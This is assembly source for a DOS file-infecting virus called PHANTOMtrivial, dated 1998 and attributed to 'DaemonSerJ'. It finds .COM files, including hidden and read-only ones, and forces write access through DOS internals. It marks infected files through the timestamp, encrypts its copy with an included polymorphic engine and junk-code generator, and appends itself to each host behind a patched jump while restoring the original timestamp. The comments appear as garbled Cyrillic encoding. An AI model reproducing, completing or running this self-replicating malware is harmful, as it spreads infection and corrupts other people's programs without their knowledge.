   ; ASM & LINK to PHTRIV.EXE
   ; EXE2BIN to PHTRIV.COM

           .model  tiny
           .486
   PHANTOMtrivial  segment para public use16 'code'
           assume  cs:PHANTOMtrivial,ds:PHANTOMtrivial
   TRIVIAL:
           call    BASE
   BASE:       pop si
           sub si,3
           mov bx,si

           xor di,di
           mov ax,cs
           add ah,10h
           mov es,ax
           mov cx,TRIVIALen
           cld
           rep movsb
           push    es
           push    offset CONTINUE

           mov di,100h
           lea si,[bx+OLDBYTES]
           cld
           push    cs
           pop es
           movsb
           movsw
           retf
   CONTINUE:
           cli
           sub sp,2Ch  ; * §¬¥à DTA
           mov dx,sp
           push    ss
           pop ds
           mov ah,1Ah
           int 21h

           push    cs
           pop ds
           mov [DTA],dx
           sti

           mov cx,00010111b   ; €âà¨¡ãâë (áªàëâë©, àå¨¢ë©,RDonly)
           mov ah,4Eh
           lea dx,[COMMASK]
   FindNext:
           int 21h
           jc  RESTORE_REGS

           mov dx,cs:[DTA]
           add dx,1Eh

           push    ss
           pop ds

           mov ax,3D00h
           int 21h

           push    cs
           pop ds
           mov [HANDLE],ax

           push    ax
           pop bx

           mov ax,1220h    ;*®¬¥à ¢å®¤  ¢ SFT
           int 2Fh     ;es:[di]

           mov bl,es:[di]  ;*®«ãç¨¬ ¡«®ª ®¯¨á ¨ï ä ©« 
           mov ax,1216h    ;es:di
           int 2Fh

           mov word ptr [FPB],di
           mov word ptr [FPB+2],es

           mov word ptr es:[di+2],2   ; *¥¦¨¬ Read/Write

           mov ax,es:[di+0Dh]
           mov dl,al
           mov dh,1Fh
           and dl,dh
           cmp dl,dh
           je  NextFile

           or  al,dh
           mov word ptr [TIME],ax
           mov ax,es:[di+0Fh]
           mov word ptr [DATE],ax

           mov bx,[HANDLE]
           lea dx,[OLDBYTES]
           mov ah,3Fh
           mov cx,3
           int 21h

           mov ax,word ptr es:[di+11h]
           add ax,100h
           jc  NextFile
           mov [RELOFFS],ax

           mov ax,cs
           mov dx,TRIVIALen
           shr dx,4
           inc dx
           add ax,dx
           mov es,ax
           shl eax,10h

           mov [TARGETPLACE],eax
           mov [DEST_CODE],0FFFFh
           mov [COUNTER],TRIVIALen

           call    PHANTOM

           xor si,si
           mov cx,TRIVIALen
           rep movsb
           push    di

           call    JuNk_DOiT

           pop cx
           mov ax,cx

           add ax,[RELOFFS]
           jc  NextFile

           lds di,[FPB]

           mov word ptr dx,ds:[di+11h]
           mov word ptr ds:[di+15h],dx

           push    ds
           pop es

           sub dx,3
           mov word ptr cs:[TRIVJUMP+1],dx

           push    word ptr cs:[TARGETPLACE+2]
           pop ds

           xor dx,dx
           mov bx,cs:[HANDLE]
           mov ah,40h
           int 21h

           xor dx,dx
           mov word ptr es:[di+15h],dx

           push    cs
           pop ds
           mov dx,offset TRIVJUMP
           mov cx,3
           mov ah,40h
           int 21h

           mov ax,5701h
           mov cx,0000h
   TIME        equ $ - 2
           mov dx,0000h
   DATE        equ $ - 2
           int 21h

           mov ah,3Eh
           int 21h
   RESTORE_REGS:
           push    cs
           pop ax
           sub ah,10h
           mov word ptr cs:[PROGSEG],AX
           push    ax
           pop ds
           push    ds
           pop es

           cli
           add sp,2Ch
           sti

           mov dx,80h
           mov ah,1Ah
           int 21h

           xor ax,ax
           xor bx,bx
           xor cx,cx
           xor dx,dx
           xor si,si
           xor di,di
           xor bp,bp
           db  0EAh      ; ‚ë«¥â ¥¬ ¢ ¯à®£à ¬¬ã
           dw  100h
   PROGSEG:    dw  0000h

   NextFile:
           mov bx,[HANDLE]
           mov ah,3Eh
           int 21h

           mov ah,4Fh
           mov dx,[DTA]
           push    ss
           pop ds
           jmp FindNext

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   include     phantom.asm
   include     trash.asm
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ TRIVIAL DATA AREA ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   CopyLeft    db  'PHANTOMtrivial - beta tester of DirectPhantom v2.1',0
   Author      db  '(C)1998 Nsk,NSTU by DaemonSerJ',0
   DTA     dw  0
   TRIVJUMP    db  0E9h
           dw  0
   OLDBYTES    db  0C3h,90h,90h
   HANDLE      dw  0

   FPB     dd  0

   RELOFFS     dw  0
   DEST_CODE   dw  0
   COUNTER     dw  0
   TARGETPLACE dd  0
   LENDECRYPTOR    dw  0
   COMMASK     db  '*.COM',0

   TRIVIALen   equ offset $

   PHANTOMtrivial  ends
           end TRIVIAL
